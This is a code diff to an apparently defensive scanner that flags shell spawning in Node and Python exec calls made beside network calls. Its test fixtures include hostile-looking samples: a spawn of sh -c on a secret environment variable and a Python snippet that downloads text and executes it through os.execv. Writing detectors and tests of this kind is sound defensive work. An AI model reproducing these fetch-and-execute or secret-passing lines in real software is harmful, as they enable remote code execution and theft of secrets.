@@ -242,7 +242,15 @@ fn command_token_with_boundary(line: &str, token: &str) -> bool {
             || after.starts_with(';')
             || after.starts_with('&')
             || after.starts_with('>')
-            || after.starts_with('<');
+            || after.starts_with('<')
+            // Quote/comma/paren close the token in the canonical Node
+            // shell-spawn idiom `spawn('sh', ['-c', …])` — without these
+            // the interpreter token failed the boundary check and the
+            // finding was de-escalated from Block to Log.
+            || after.starts_with('\'')
+            || after.starts_with('"')
+            || after.starts_with(',')
+            || after.starts_with(')');
         if left_ok && right_ok {
             return true;
         }
@@ -262,8 +270,12 @@ pub(crate) fn detect_python_exec_network(
     let has_exec = content_lower.contains("subprocess.")
         || content_lower.contains("os.system(")
         || content_lower.contains("os.popen(")
-        || content_lower.contains("os.execvp(")
-        || content_lower.contains("os.execvpe(");
+        // `os.exec` is the common prefix of the whole exec* family
+        // (execl/execle/execlp/execlpe/execv/execve/execvp/execvpe) —
+        // pre-fix only execvp/execvpe were listed, so `os.execv(...)`
+        // beside a network call lost the exec->network escalation.
+        || content_lower.contains("os.exec")
+        || content_lower.contains("os.posix_spawn(");
     let has_network = content_lower.contains("requests.")
         || content_lower.contains("urllib.request")
         || content_lower.contains("urlopen(")
@@ -507,6 +519,43 @@ mod tests {
             assert_eq!(findings[0].severity, Severity::Medium);
             assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
         }
+    }
+
+    /// # Contract
+    ///
+    /// The canonical Node shell-spawn idiom `spawn('sh', ['-c', …])` —
+    /// interpreter as a fully-quoted first arg with an args array —
+    /// escalates to Medium/Block. Pre-fix the closing quote / comma after
+    /// the interpreter token failed the boundary check, de-escalating the
+    /// single most common real malicious shape to Low/Log.
+    #[test]
+    fn detect_node_process_exec_escalates_for_quoted_arg_array_spawn() {
+        for content in [
+            "const { spawn } = require('child_process');\nspawn('sh', ['-c', process.env.SECRET]);\n",
+            "const { spawn } = require('child_process');\nspawn('bash', ['-c', cmd]);\n",
+        ] {
+            let lower = content.to_ascii_lowercase();
+            let findings = detect_node_process_exec(&lower, "js", "/tmp/script.js");
+            assert_eq!(findings.len(), 1, "{content:?} must emit one finding");
+            assert_eq!(findings[0].severity, Severity::Medium);
+            assert_eq!(findings[0].recommended_action, RecommendedAction::Block);
+        }
+    }
+
+    /// # Contract
+    ///
+    /// The full `os.exec*` family (not just execvp/execvpe) beside a
+    /// network call triggers the Python exec->network escalation.
+    #[test]
+    fn detect_python_exec_network_covers_full_exec_family() {
+        let content =
+            "import os, requests\nd = requests.get('http://x').text\nos.execv('/bin/sh', ['sh','-c',d])\n";
+        let lower = content.to_ascii_lowercase();
+        let findings = detect_python_exec_network(&lower, "py", "/tmp/s.py");
+        assert!(
+            !findings.is_empty(),
+            "os.execv + network must emit the exec-network finding"
+        );
     }
 
     /// # Contract
